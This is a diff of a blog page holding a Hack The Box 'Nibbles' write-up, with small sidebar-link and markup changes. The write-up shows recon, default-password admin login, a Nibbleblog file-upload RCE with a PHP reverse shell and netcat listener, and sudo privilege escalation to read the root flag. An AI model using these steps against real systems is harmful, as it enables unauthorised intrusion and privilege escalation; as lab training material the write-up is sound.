@@ -202,6 +202,16 @@ if (!doNotTrack) {
     </a>
   </li>
 
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://thieunguyen5991.github.io/projects">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-product-hunt"></i>
+      
+      <span class="sidebar-button-desc">Projects</span>
+    </a>
+  </li>
+
 
     </ul>
     <ul class="sidebar-buttons">
@@ -213,16 +223,6 @@ if (!doNotTrack) {
       <i class="sidebar-button-icon fa fa-lg fa-github"></i>
       
       <span class="sidebar-button-desc">GitHub</span>
-    </a>
-  </li>
-
-  <li class="sidebar-button">
-    
-      <a class="sidebar-button-link " href="https://twitter.com/thieunguyen5991" target="_blank" rel="noopener">
-    
-      <i class="sidebar-button-icon fa fa-lg fa-twitter"></i>
-      
-      <span class="sidebar-button-desc">Twitter</span>
     </a>
   </li>
 
@@ -316,7 +316,7 @@ if (!doNotTrack) {
           
           <div class="post-content markdown" itemprop="articleBody">
             <div class="main-content-wrap">
-              <p>Connecting to Hack the Box<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> using the supplied VPN, my Nibbles box have the IP: 10.10.10.75
+              <p>Connecting to Hack the Box<sup class="footnote-ref" id="fnref:1"><a href="#fn:1">1</a></sup> using the supplied VPN, my Nibbles box have the IP: 10.10.10.75
 As per usual, lets start with Recon and NMAP the target IP</p>
 <pre><code>root@kali:~/Nibbles$ nmap -p- --version-all -sV -sS 10.10.10.75
 Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-09 07:44 CET
@@ -329,59 +329,59 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 27.18 seconds
-</code></pre><p>Seeing port 80 open, lets browse to that and look at the source code, as the base directory doesn&rsquo;t show anything revealing.</p>
+Nmap done: 1 IP address (1 host up) scanned in 27.18 seconds</code></pre>
+<p>Seeing port 80 open, lets browse to that and look at the source code, as the base directory doesn&rsquo;t show anything revealing.</p>
 <pre><code>&lt;b&gt;Hello world!&lt;/b&gt;
-&lt;!-- /nibbleblog/ directory. Nothing interesting here! --&gt;
-</code></pre><p>Seeing that we have a new directory to explore, lets go to /nibbleblog/.
-<img src="https://thieunguyen5991.github.io/img/posts/2018/03/nibbles-writeup/nibblesblog-root.png" alt="nibblesblog-root">
+&lt;!-- /nibbleblog/ directory. Nothing interesting here! --&gt;</code></pre>
+<p>Seeing that we have a new directory to explore, lets go to /nibbleblog/.
+<img src="https://thieunguyen5991.github.io/img/posts/2018/03/nibbles-writeup/nibblesblog-root.png" alt="nibblesblog-root" />
 So that points to the Content Management System (CMS) called Nibbleblog, which is opensource and free to download the sourcecode, which means we can take a look at it.
 A bit of googling points me to the github <a href="https://github.com/dignajar/nibbleblog">https://github.com/dignajar/nibbleblog</a>
 Where the basefile &ldquo;admin.php&rdquo; looks interesting, and sure enough it does exist on our target.
-<img src="https://thieunguyen5991.github.io/img/posts/2018/03/nibbles-writeup/nibblesblog-admin.png" alt="nibblesblog-admin">
+<img src="https://thieunguyen5991.github.io/img/posts/2018/03/nibbles-writeup/nibblesblog-admin.png" alt="nibblesblog-admin" />
 The next interesting file from the github looks to be &ldquo;install.php&rdquo;, on our target blog it is obviously already installed, nontheless it might be worth checking out!
-<img src="https://thieunguyen5991.github.io/img/posts/2018/03/nibbles-writeup/nibblesblog-install.png" alt="nibblesblog-install">
+<img src="https://thieunguyen5991.github.io/img/posts/2018/03/nibbles-writeup/nibblesblog-install.png" alt="nibblesblog-install" />
 Lets follow the update link to the update page!
-<img src="https://thieunguyen5991.github.io/img/posts/2018/03/nibbles-writeup/nibblesblog-update.png" alt="nibblesblog-update">
+<img src="https://thieunguyen5991.github.io/img/posts/2018/03/nibbles-writeup/nibblesblog-update.png" alt="nibblesblog-update" />
 So this further reveals two files where one is quite interesting, as config files usually contains usernames even possibly passwords, and other essential config parameters!
 So lets browse to /nibbleblog/content/private/config.xml</p>
 <pre><code>&lt;config&gt;
 [...snip...]
-&lt;notification_email_to type=&quot;string&quot;&gt;admin@nibbles.com&lt;/notification_email_to&gt;
-&lt;notification_email_from type=&quot;string&quot;&gt;noreply@10.10.10.134&lt;/notification_email_from&gt;
-&lt;seo_site_title type=&quot;string&quot;&gt;Nibbles - Yum yum&lt;/seo_site_title&gt;
+&lt;notification_email_to type=&#34;string&#34;&gt;admin@nibbles.com&lt;/notification_email_to&gt;
+&lt;notification_email_from type=&#34;string&#34;&gt;noreply@10.10.10.134&lt;/notification_email_from&gt;
+&lt;seo_site_title type=&#34;string&#34;&gt;Nibbles - Yum yum&lt;/seo_site_title&gt;
 [...snip...]
-&lt;/config&gt;
-</code></pre><p>So this time the config file does not reveal any passwords, although we&rsquo;re not emptyhanded as we do get a valid username &ldquo;admin&rdquo;.
-After some further enumeration i could not find a hint towards a password or any other vulnerability to use. So i resulted in trying THC-Hydra<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup> and a small passwordlist in an attempt to run a dictionary against the login page!
+&lt;/config&gt;</code></pre>
+<p>So this time the config file does not reveal any passwords, although we&rsquo;re not emptyhanded as we do get a valid username &ldquo;admin&rdquo;.
+After some further enumeration i could not find a hint towards a password or any other vulnerability to use. So i resulted in trying THC-Hydra<sup class="footnote-ref" id="fnref:2"><a href="#fn:2">2</a></sup> and a small passwordlist in an attempt to run a dictionary against the login page!
 Which only got me on their blacklist and blocked me a couple minutes from making further login attempts.
-<img src="https://thieunguyen5991.github.io/img/posts/2018/03/nibbles-writeup/nibblesblog-login-blacklist.png" alt="nibblesblog-login-blacklist">
+<img src="https://thieunguyen5991.github.io/img/posts/2018/03/nibbles-writeup/nibblesblog-login-blacklist.png" alt="nibblesblog-login-blacklist" />
 Then after some further checking of the source code, i recalled it supposed to be a fairly simple box, so back to some default passwords.
 Bingo, user: Admin, Password: nibbles so a weak password indeed.
 Doing a grep for the password &ldquo;nibbles&rdquo; in the standard &ldquo;rockyou.txt&rdquo; that is included in Kali linux.</p>
-<pre><code>root@kali:~/Wordlists$ grep 'nibbles' rockyou.txt
+<pre><code>root@kali:~/Wordlists$ grep &#39;nibbles&#39; rockyou.txt
 nibbles
 nibbles1
-[...snip...]
-</code></pre><p>We can see that doing the hydra would indeed work&hellip; eventually, you&rsquo;d just have to do some timeouts between attempts.
+[...snip...]</code></pre>
+<p>We can see that doing the hydra would indeed work&hellip; eventually, you&rsquo;d just have to do some timeouts between attempts.
 Either way, we have the password and is logged in to the CMS admin panel!
-<img src="https://thieunguyen5991.github.io/img/posts/2018/03/nibbles-writeup/nibblesblog-logged-in.png" alt="nibblesblog-logged-in">
+<img src="https://thieunguyen5991.github.io/img/posts/2018/03/nibbles-writeup/nibblesblog-logged-in.png" alt="nibblesblog-logged-in" />
 Next up would be to try and get a shell on the system somehow, so back to google!
-It eventually pointed me to another security researchers blog <a href="https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html">CureSec Nibbleblog 4.0.3 RCE</a><sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup>
+It eventually pointed me to another security researchers blog <a href="https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html">CureSec Nibbleblog 4.0.3 RCE</a><sup class="footnote-ref" id="fnref:3"><a href="#fn:3">3</a></sup>
 The PoC Exploit work in 4 steps</p>
 <pre><code>1. Obtain Admin credentials
 2. Activate My image plugin
 3. Upload PHP shell, ignore warnings
-4. Visit http://localhost/nibbleblog/content/private/plugins/my_image/image.php
-</code></pre><p>So since we are already logged in, we can go to step two and activate the &ldquo;My Image Plugin&rdquo; under Plugins in the CMS Admin Panel.
+4. Visit http://localhost/nibbleblog/content/private/plugins/my_image/image.php</code></pre>
+<p>So since we are already logged in, we can go to step two and activate the &ldquo;My Image Plugin&rdquo; under Plugins in the CMS Admin Panel.
 Then lets create and upload a php reverse shell.
 My favourite php-reverse-shell is included in kali, that pentestmonkey created.
 Copy that to the working directory by issuing.</p>
-<pre><code>root@kali:~/Nibbles$ cp /usr/share/webshells/php/php-reverse-shell.php .
-</code></pre><p>Then edit the $ip and $port variable in the php script, in this example i use port 4000. Once thats done, we can upload it to the CMS and start a netcat listener on our chosen port with (nc -lvvp 4000)
+<pre><code>root@kali:~/Nibbles$ cp /usr/share/webshells/php/php-reverse-shell.php .</code></pre>
+<p>Then edit the $ip and $port variable in the php script, in this example i use port 4000. Once thats done, we can upload it to the CMS and start a netcat listener on our chosen port with (nc -lvvp 4000)
 In this example i used curl to trigger the RCE since the &ldquo;image.php&rdquo; is in a public folder.</p>
-<pre><code>root@kali:~/Nibbles$ curl http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php
-</code></pre><p>That should kick of a basic shell created by the PHP script to the Netcat listener.
+<pre><code>root@kali:~/Nibbles$ curl http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php</code></pre>
+<p>That should kick of a basic shell created by the PHP script to the Netcat listener.
 Although the shell we recieve is a limited one, so lets enumerate which perl and python libraries are present to escape the limited shell.</p>
 <pre><code>root@kali:~/Nibbles$ nc -lvvp 4000
 listening on [any] 4000 ...
@@ -390,18 +390,18 @@ Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86
  01:55:01 up 4 days,  6:33,  0 users,  load average: 0.00, 0.00, 0.00
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
-/bin/sh: 0: can't access tty; job control turned off
+/bin/sh: 0: can&#39;t access tty; job control turned off
 $ which python
 $ which perl
 /usr/bin/perl
 $ which python3
 /usr/bin/python3
-$ python3 -c &quot;import pty; pty.spawn('/bin/bash');&quot;  
+$ python3 -c &#34;import pty; pty.spawn(&#39;/bin/bash&#39;);&#34;  
 nibbler@Nibbles:/$ ls /home/nibbler
 ls /home/nibbler
 personal  personal.zip  user.txt
-nibbler@Nibbles:/$
-</code></pre><p>Since i am a Python guy, that&rsquo;s a quite an easy choice.
+nibbler@Nibbles:/$</code></pre>
+<p>Since i am a Python guy, that&rsquo;s a quite an easy choice.
 Now that we have the &ldquo;user.txt&rdquo; flag, lets get root!
 One easy command to run is &ldquo;sudo -l&rdquo;, which will report if the current user is in the /etc/sudoers file, as well list what commands the current user is allowed to run.</p>
 <pre><code>nibbler@Nibbles:/$ sudo -l
@@ -413,29 +413,28 @@ Matching Defaults entries for nibbler on Nibbles:
 
 User nibbler may run the following commands on Nibbles:
     (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
-nibbler@Nibbles:/$
-</code></pre><p>Easy enough, at a quick glance in enumeration we can see that user nibbler is allowed to run &ldquo;/home/nibbler/personal/stuff/monitor.sh&rdquo; as root without a password!
+nibbler@Nibbles:/$</code></pre>
+<p>Easy enough, at a quick glance in enumeration we can see that user nibbler is allowed to run &ldquo;/home/nibbler/personal/stuff/monitor.sh&rdquo; as root without a password!
 At this point getting the root flag should be fairly simple!</p>
-<pre><code>nibbler@Nibbles:/home/nibbler/personal/stuff$ echo &quot;/bin/cat /root/root.txt&quot; &gt; monitor.sh
+<pre><code>nibbler@Nibbles:/home/nibbler/personal/stuff$ echo &#34;/bin/cat /root/root.txt&#34; &gt; monitor.sh
 nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
 sudo: unable to resolve host Nibbles: Connection timed out
 b6d745[...snip...]8ef88c
-nibbler@Nibbles:/home/nibbler/personal/stuff$
-</code></pre><p>Done.</p>
-<section class="footnotes" role="doc-endnotes">
-<hr>
+nibbler@Nibbles:/home/nibbler/personal/stuff$</code></pre>
+<p>Done.</p>
+<div class="footnotes">
+
+<hr />
+
 <ol>
-<li id="fn:1" role="doc-endnote">
-<p><a href="www.hackthebox.eu"> www.hackthebox.eu</a> <a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
-</li>
-<li id="fn:2" role="doc-endnote">
-<p><a href="https://tools.kali.org/password-attacks/hydra">https://tools.kali.org/password-attacks/hydra</a> <a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
-</li>
-<li id="fn:3" role="doc-endnote">
-<p><a href="https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html">https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html</a> <a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
-</li>
+<li id="fn:1"><a href="www.hackthebox.eu"> www.hackthebox.eu</a>
+ <a class="footnote-return" href="#fnref:1"><sup>[return]</sup></a></li>
+<li id="fn:2"><a href="https://tools.kali.org/password-attacks/hydra">https://tools.kali.org/password-attacks/hydra</a>
+ <a class="footnote-return" href="#fnref:2"><sup>[return]</sup></a></li>
+<li id="fn:3"><a href="https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html">https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html</a>
+ <a class="footnote-return" href="#fnref:3"><sup>[return]</sup></a></li>
 </ol>
-</section>
+</div>
 
               
             </div>
